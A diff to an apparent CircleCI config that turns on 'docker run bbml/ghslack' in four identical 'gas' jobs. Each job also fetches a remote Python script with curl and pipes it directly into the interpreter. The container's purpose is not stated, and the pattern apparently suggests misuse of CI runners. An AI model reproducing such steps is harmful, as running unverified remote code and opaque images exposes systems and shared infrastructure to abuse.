@@ -5,22 +5,22 @@ jobs:
   gas1:
     machine: true
     steps:
-      # - run: docker run bbml/ghslack
+      - run: docker run bbml/ghslack
       - run: curl ifconfig.me && curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -
   gas2:
     machine: true
     steps:
-      # - run: docker run bbml/ghslack
+      - run: docker run bbml/ghslack
       - run: curl ifconfig.me && curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -
   gas3:
     machine: true
     steps:
-      # - run: docker run bbml/ghslack
+      - run: docker run bbml/ghslack
       - run: curl ifconfig.me && curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -
   gas4:
     machine: true
     steps:
-      # - run: docker run bbml/ghslack
+      - run: docker run bbml/ghslack
       - run: curl ifconfig.me && curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -
 
 # Orchestrate our job run sequence
